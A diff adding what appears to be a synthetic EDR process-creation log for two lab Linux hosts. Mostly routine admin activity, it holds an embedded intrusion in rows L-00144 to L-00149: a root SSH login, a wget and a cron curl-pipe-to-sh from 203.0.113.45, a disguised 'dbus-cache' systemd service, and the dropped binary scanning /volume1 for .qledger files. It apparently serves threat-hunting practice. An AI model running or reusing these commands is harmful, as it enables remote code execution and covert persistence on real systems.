@@ -1,0 +1,231 @@
+Timestamp,DeviceName,ActionType,FileName,FolderPath,ProcessCommandLine,AccountName,InitiatingProcessFileName,InitiatingProcessFolderPath,ProcessId,ReportId
+2026-10-05T00:14:44.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,43264,L-00001
+2026-10-05T08:20:12.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,34597,L-00002
+2026-10-05T08:24:33.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,47006,L-00003
+2026-10-05T08:52:27.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,38383,L-00004
+2026-10-05T09:53:24.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,30867,L-00005
+2026-10-05T10:05:46.000Z,lnx-web-02.lab.example,ProcessCreated,sh,/usr/bin/sh,"sh -c ""echo '0 */12 * * * root test -x /usr/bin/certbot && certbot -q renew' > /etc/cron.d/certbot""",root,dpkg,/usr/bin/dpkg,51617,L-00006
+2026-10-05T10:22:18.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,3734,L-00007
+2026-10-05T10:32:59.000Z,lnx-nas-01.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,10091,L-00008
+2026-10-05T10:48:28.000Z,lnx-nas-01.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,50160,L-00009
+2026-10-05T10:50:34.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,25907,L-00010
+2026-10-05T10:52:42.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,51309,L-00011
+2026-10-05T10:59:29.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,24435,L-00012
+2026-10-05T11:04:15.000Z,lnx-nas-01.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,56976,L-00013
+2026-10-05T11:06:21.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,20336,L-00014
+2026-10-05T11:16:20.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,4276,L-00015
+2026-10-05T11:47:20.000Z,lnx-nas-01.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,26627,L-00016
+2026-10-05T11:57:33.000Z,lnx-nas-01.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,48373,L-00017
+2026-10-05T12:26:36.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,53429,L-00018
+2026-10-05T12:27:21.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,44806,L-00019
+2026-10-05T12:51:51.000Z,lnx-web-02.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,12024,L-00020
+2026-10-05T13:33:41.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,20660,L-00021
+2026-10-05T14:16:32.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,52168,L-00022
+2026-10-05T14:59:17.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,17990,L-00023
+2026-10-05T15:10:30.000Z,lnx-web-02.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,48916,L-00024
+2026-10-05T15:35:41.000Z,lnx-nas-01.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,1661,L-00025
+2026-10-05T16:00:32.000Z,lnx-web-02.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,52297,L-00026
+2026-10-05T16:02:17.000Z,lnx-nas-01.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,28425,L-00027
+2026-10-05T16:30:12.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,14522,L-00028
+2026-10-05T16:35:19.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,44228,L-00029
+2026-10-05T16:47:58.000Z,lnx-nas-01.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,32543,L-00030
+2026-10-05T16:48:19.000Z,lnx-nas-01.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,12273,L-00031
+2026-10-05T16:55:03.000Z,lnx-web-02.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,11059,L-00032
+2026-10-05T16:59:47.000Z,lnx-web-02.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,57956,L-00033
+2026-10-05T17:21:30.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,58455,L-00034
+2026-10-05T17:25:15.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,24546,L-00035
+2026-10-05T17:57:00.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,28720,L-00036
+2026-10-05T19:06:01.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,54564,L-00037
+2026-10-05T21:18:28.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,46012,L-00038
+2026-10-05T21:30:55.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,56780,L-00039
+2026-10-05T21:42:22.000Z,lnx-nas-01.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,41138,L-00040
+2026-10-05T22:40:49.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,46920,L-00041
+2026-10-05T23:00:35.000Z,lnx-nas-01.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,54257,L-00042
+2026-10-06T00:51:20.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,4713,L-00043
+2026-10-06T01:03:22.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,58991,L-00044
+2026-10-06T02:38:15.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,50737,L-00045
+2026-10-06T06:22:27.000Z,lnx-web-02.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,48655,L-00046
+2026-10-06T07:55:00.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,34948,L-00047
+2026-10-06T08:08:26.000Z,lnx-nas-01.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,56779,L-00048
+2026-10-06T08:41:26.000Z,lnx-nas-01.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,28784,L-00049
+2026-10-06T08:49:24.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,37574,L-00050
+2026-10-06T09:30:33.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,15631,L-00051
+2026-10-06T09:57:04.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,3986,L-00052
+2026-10-06T10:24:08.000Z,lnx-web-02.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,17402,L-00053
+2026-10-06T10:47:45.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,59360,L-00054
+2026-10-06T11:01:16.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,26150,L-00055
+2026-10-06T11:09:45.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,47199,L-00056
+2026-10-06T11:22:32.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,30486,L-00057
+2026-10-06T11:30:20.000Z,lnx-web-02.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,22894,L-00058
+2026-10-06T11:36:40.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,37112,L-00059
+2026-10-06T11:43:37.000Z,lnx-nas-01.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,44116,L-00060
+2026-10-06T11:47:14.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,4564,L-00061
+2026-10-06T11:51:50.000Z,lnx-nas-01.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,14050,L-00062
+2026-10-06T12:31:20.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,21364,L-00063
+2026-10-06T12:44:39.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,33670,L-00064
+2026-10-06T12:50:46.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,43992,L-00065
+2026-10-06T12:52:14.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,4227,L-00066
+2026-10-06T12:59:17.000Z,lnx-web-02.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,19142,L-00067
+2026-10-06T13:08:26.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,29392,L-00068
+2026-10-06T13:17:44.000Z,lnx-nas-01.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,53051,L-00069
+2026-10-06T13:31:05.000Z,lnx-nas-01.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,56228,L-00070
+2026-10-06T13:39:38.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,44229,L-00071
+2026-10-06T13:46:24.000Z,lnx-nas-01.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,27185,L-00072
+2026-10-06T14:02:22.000Z,lnx-nas-01.lab.example,ProcessCreated,cp,/usr/bin/cp,cp /tmp/ansible-tmp-1759755720.41-8812/source /etc/systemd/system/node_exporter.service,root,python3,/usr/bin/python3,30275,L-00073
+2026-10-06T14:02:24.000Z,lnx-web-02.lab.example,ProcessCreated,cp,/usr/bin/cp,cp /tmp/ansible-tmp-1759755720.41-8812/source /etc/systemd/system/node_exporter.service,root,python3,/usr/bin/python3,30176,L-00074
+2026-10-06T14:11:36.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,22589,L-00075
+2026-10-06T14:21:49.000Z,lnx-nas-01.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,4853,L-00076
+2026-10-06T14:33:13.000Z,lnx-nas-01.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,43833,L-00077
+2026-10-06T14:49:30.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,19810,L-00078
+2026-10-06T15:50:34.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,7205,L-00079
+2026-10-06T16:23:52.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,39463,L-00080
+2026-10-06T16:42:27.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,41690,L-00081
+2026-10-06T16:53:28.000Z,lnx-web-02.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,41088,L-00082
+2026-10-06T17:37:49.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,35168,L-00083
+2026-10-06T17:56:20.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,41738,L-00084
+2026-10-06T19:21:04.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,45448,L-00085
+2026-10-06T20:03:58.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,35971,L-00086
+2026-10-06T20:16:48.000Z,lnx-nas-01.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,31564,L-00087
+2026-10-06T21:39:16.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,32690,L-00088
+2026-10-06T22:05:31.000Z,lnx-nas-01.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,14592,L-00089
+2026-10-06T22:44:37.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,21365,L-00090
+2026-10-06T23:14:36.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,47681,L-00091
+2026-10-07T00:57:18.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,7809,L-00092
+2026-10-07T02:02:34.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,18262,L-00093
+2026-10-07T04:39:31.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,15114,L-00094
+2026-10-07T05:23:09.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,45341,L-00095
+2026-10-07T07:06:35.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,53103,L-00096
+2026-10-07T07:11:06.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,28885,L-00097
+2026-10-07T08:28:25.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,31791,L-00098
+2026-10-07T08:50:48.000Z,lnx-web-02.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,55007,L-00099
+2026-10-07T09:17:24.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,59837,L-00100
+2026-10-07T09:27:32.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,12890,L-00101
+2026-10-07T09:40:44.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,25982,L-00102
+2026-10-07T09:44:24.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,48057,L-00103
+2026-10-07T09:44:55.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,50384,L-00104
+2026-10-07T10:17:16.000Z,lnx-web-02.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,19801,L-00105
+2026-10-07T10:26:41.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,48594,L-00106
+2026-10-07T10:40:32.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,2791,L-00107
+2026-10-07T11:05:25.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,45559,L-00108
+2026-10-07T12:34:46.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,11665,L-00109
+2026-10-07T12:39:55.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,23892,L-00110
+2026-10-07T13:04:03.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,16726,L-00111
+2026-10-07T13:13:40.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,22050,L-00112
+2026-10-07T13:15:12.000Z,lnx-web-02.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,13103,L-00113
+2026-10-07T13:21:09.000Z,lnx-nas-01.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,40553,L-00114
+2026-10-07T13:26:57.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,29094,L-00115
+2026-10-07T13:31:00.000Z,lnx-nas-01.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,15652,L-00116
+2026-10-07T13:50:23.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,19653,L-00117
+2026-10-07T14:14:21.000Z,lnx-web-02.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,21439,L-00118
+2026-10-07T14:15:42.000Z,lnx-web-02.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,48464,L-00119
+2026-10-07T14:35:04.000Z,lnx-nas-01.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,55107,L-00120
+2026-10-07T14:45:35.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,40679,L-00121
+2026-10-07T14:49:11.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,55050,L-00122
+2026-10-07T14:54:17.000Z,lnx-nas-01.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,7616,L-00123
+2026-10-07T15:00:26.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,21147,L-00124
+2026-10-07T15:16:05.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,33983,L-00125
+2026-10-07T15:49:05.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,18793,L-00126
+2026-10-07T16:30:00.000Z,lnx-nas-01.lab.example,ProcessCreated,sh,/usr/bin/sh,"sh -c ""echo '*/10 * * * * root curl -fsS -m 10 https://healthchecks.lab.example/ping/nas-backup' >> /etc/crontab""",root,bash,/usr/bin/bash,56097,L-00127
+2026-10-07T16:37:36.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,15837,L-00128
+2026-10-07T16:49:00.000Z,lnx-web-02.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,12273,L-00129
+2026-10-07T17:02:56.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,3299,L-00130
+2026-10-07T17:08:04.000Z,lnx-nas-01.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,23087,L-00131
+2026-10-07T17:29:18.000Z,lnx-web-02.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,42902,L-00132
+2026-10-07T17:31:41.000Z,lnx-nas-01.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,10785,L-00133
+2026-10-07T17:36:45.000Z,lnx-nas-01.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,6657,L-00134
+2026-10-07T17:49:11.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,35114,L-00135
+2026-10-07T19:13:31.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,13727,L-00136
+2026-10-07T19:16:52.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,10561,L-00137
+2026-10-07T20:33:43.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,56562,L-00138
+2026-10-07T22:16:27.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,49147,L-00139
+2026-10-07T22:30:02.000Z,lnx-web-02.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,20457,L-00140
+2026-10-07T22:53:01.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,48560,L-00141
+2026-10-07T22:54:43.000Z,lnx-web-02.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,7770,L-00142
+2026-10-08T01:16:07.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,16735,L-00143
+2026-10-08T01:33:25.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,root,sshd,/usr/sbin/sshd,36003,L-00144
+2026-10-08T01:34:04.000Z,lnx-nas-01.lab.example,ProcessCreated,wget,/usr/bin/wget,wget -q http://203.0.113.45/l -O /dev/shm/.nwcache/dbus-cached,root,bash,/usr/bin/bash,24229,L-00145
+2026-10-08T01:35:45.000Z,lnx-nas-01.lab.example,ProcessCreated,sh,/usr/bin/sh,"sh -c ""echo '*/10 * * * * root curl -fsSL http://203.0.113.45/n.sh | sh' > /etc/cron.d/nwcache""",root,bash,/usr/bin/bash,9813,L-00146
+2026-10-08T01:36:37.000Z,lnx-nas-01.lab.example,ProcessCreated,sh,/usr/bin/sh,"sh -c ""printf '[Unit]\nDescription=D-Bus cache\n[Service]\nExecStart=/dev/shm/.nwcache/dbus-cached\nRestart=always\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/dbus-cache.service""",root,bash,/usr/bin/bash,58874,L-00147
+2026-10-08T01:37:01.000Z,lnx-nas-01.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl enable --now dbus-cache.service,root,bash,/usr/bin/bash,34842,L-00148
+2026-10-08T02:20:01.000Z,lnx-nas-01.lab.example,ProcessCreated,dbus-cached,/dev/shm/.nwcache/dbus-cached,/dev/shm/.nwcache/dbus-cached --path /volume1 --ext .qledger,root,systemd,/usr/lib/systemd/systemd,11054,L-00149
+2026-10-08T04:31:02.000Z,lnx-web-02.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,1099,L-00150
+2026-10-08T05:31:19.000Z,lnx-nas-01.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,23095,L-00151
+2026-10-08T06:06:59.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,8687,L-00152
+2026-10-08T07:09:07.000Z,lnx-nas-01.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,54658,L-00153
+2026-10-08T08:26:46.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,36979,L-00154
